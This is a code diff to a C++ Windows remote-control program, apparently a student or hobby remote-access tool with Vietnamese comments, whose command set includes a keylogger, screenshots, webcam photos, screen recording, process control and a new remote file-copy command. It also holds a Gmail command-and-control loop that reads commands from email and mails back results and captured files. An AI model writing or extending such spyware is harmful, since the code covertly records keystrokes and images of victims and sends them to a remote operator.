@@ -17,43 +17,6 @@ void receiveResponse(SOCKET clientSock)
     std::cout << "Received response: " << buffer << std::endl;
 }
 
-void receiveKeyloggerLog(SOCKET sock)
-{
-    uint32_t len = 0;
-
-    int received = recv(sock, (char*)&len, sizeof(len), 0);
-    if (received != sizeof(len))
-    {
-        std::cerr << "Failed to receive keylogger log length." << std::endl;
-        return;
-    }
-    if (len == 0)
-    {
-        std::cout << "No keylogger log available." << std::endl;
-        return;
-    }
-
-    char* buffer = new char[len + 1];
-    int total = 0;
-
-    while (total < len)
-    {
-        int bytes = recv(sock, buffer + total, len - total, 0);
-        if (bytes <= 0)
-        {
-            std::cerr << "Failed to receive keylogger log content." << std::endl;
-            delete[] buffer;
-            return;
-        }
-        total += bytes;
-    }
-
-    buffer[len] = '\0'; // Null-terminate the string
-    std::cout << "Received keylogger log (" << len << " bytes):" << std::endl;
-    std::cout << buffer << std::endl;
-    delete[] buffer;
-}
-
 void receiveFile(SOCKET sock)
 {
     uint32_t nameLen;
@@ -183,23 +146,23 @@ void sendResponse(SOCKET sock, const std::string& msg)
     }
 }
 
-bool isValidCommand(const std::string& cmd)
-{
-    static const std::set<std::string> validCommands = {
-        "help", "list_services", "start ", "stop ", "list_apps",
-        "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
-        "restart", "shutdown", "start_record", "stop_record", "gmail_server"
-    };
+// bool isValidCommand(const std::string& cmd)
+// {
+//     static const std::set<std::string> validCommands = {
+//         "help", "list_services", "start ", "stop ", "list_apps",
+//         "start_keylogger", "stop_keylogger", "screenshot", "webcam_photo",
+//         "restart", "shutdown", "start_record", "stop_record", "gmail_server"
+//     };
 
-    for (const auto& validCmd : validCommands)
-    {
-        if (cmd == validCmd || cmd.rfind(validCmd, 0) == 0) // check prefix
-        {
-            return true;
-        }
-    }
-    return false;
-}
+//     for (const auto& validCmd : validCommands)
+//     {
+//         if (cmd == validCmd || cmd.rfind(validCmd, 0) == 0) // check prefix
+//         {
+//             return true;
+//         }
+//     }
+//     return false;
+// }
 
 void handleCommand(SOCKET sock, const std::string& cmd)
 {
@@ -212,6 +175,7 @@ void handleCommand(SOCKET sock, const std::string& cmd)
             "  start <path>            - Start a process from given path\n"
             "  stop <process_name>     - Stop a process by name\n"
             "  list_apps               - List all visible applications\n"
+            "  copyfile <source>       - Copy file from source to current directory\n"
             "  start_keylogger         - Start keylogger\n"
             "  stop_keylogger          - Stop keylogger\n"
             "  screenshot              - Capture screen and save as PNG\n"
@@ -247,6 +211,15 @@ void handleCommand(SOCKET sock, const std::string& cmd)
     {
         std::string apps = listUserApps();
         sendResponse(sock, apps);
+    }
+    else if (cmd.rfind("copyfile ", 0) == 0)
+    {
+        std::string sourcePath = cmd.substr(9);
+        std::string destPath = fs::current_path().string() + "/" + fs::path(sourcePath).filename().string();
+        
+        bool ok = copyFile(sourcePath, destPath);
+        std::string msg = ok ? "File copied successfully: " + destPath : "Failed to copy file.";
+        sendResponse(sock, msg);
     }
     else if (cmd == "exit")
     {
@@ -389,44 +362,11 @@ int main()
 
     // run local Gmail server in a separate thread
     std::thread gmailThread([&clientSock]() {
-        while (true)
-        {
-            if (!refreshAccessToken())
-            {
-                std::cerr << "[Gmail] Failed to refresh token." << std::endl;
-                std::this_thread::sleep_for(std::chrono::minutes(10));
-                continue;
-            }
-
-            std::string cmd = readLastEmailCommand();
-            if (!cmd.empty())
-            {
-                std::string response = executeCommand(cmd);
-
-                auto ends_with = [](const std::string& str, const std::string& suffix) {
-                    return str.size() >= suffix.size() &&
-                        str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
-                };
-
-                if (ends_with(response, ".png") || ends_with(response, ".jpg") || ends_with(response, ".avi") || ends_with(response, ".txt"))
-                {
-                    std::string filepath = exe_dir + response;
-                    if (!fs::exists(filepath)) {
-                        std::cerr << "Attachment not found: " << filepath << std::endl;
-                        sendEmail("Command Result", "Result: " + response + "\n(Attachment file missing: " + filepath + ")");
-                    } else {
-                        sendEmailWithAttachment("Command Result", "Result of command: " + cmd, filepath);
-                    }
-                }
-
-                else
-                {
-                    sendEmail("Command Result", response);
-                }
-            }
-
-            std::this_thread::sleep_for(std::chrono::seconds(10));
-        }
+        startGmailControlLoop();
+        // Sau khi vòng lặp kết thúc, gửi thông báo đến client
+        std::string msg = "Gmail control loop stopped.";
+        sendResponse(clientSock, msg);
+        closesocket(clientSock); // Đóng socket client khi kết thúc
     });
 
     gmailThread.detach(); // Detach the thread to run independently
